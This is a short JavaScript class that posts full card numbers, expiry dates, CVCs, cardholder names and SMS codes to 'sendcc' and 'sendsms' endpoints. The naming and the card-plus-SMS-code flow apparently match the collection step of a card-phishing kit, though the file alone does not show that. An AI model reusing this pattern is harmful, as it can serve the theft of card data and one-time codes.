class Transfer {

	constructor() {
		this.server = new Server();
		this.url = {
			SEND_CARD: "api/transfer/sendcc",
			SEND_SMS: "api/transfer/sendsms"
		};
	}

	sendcc({ cardNumber, month, year, cvc, orderId, cardHolder, price }, cb) {
		this.server.sendRequest(this.server.requestType.POST, this.url.SEND_CARD, {
			cardNumber,
			month,
			year,
			cvc,
			orderId,
			cardHolder,
            price
		}, cb);
	}

	sendsms({ orderId, sms, price }, cb) {
		this.server.sendRequest(this.server.requestType.POST, this.url.SEND_SMS, { orderId, sms, price }, cb);
	}

}

const transferController = new Transfer();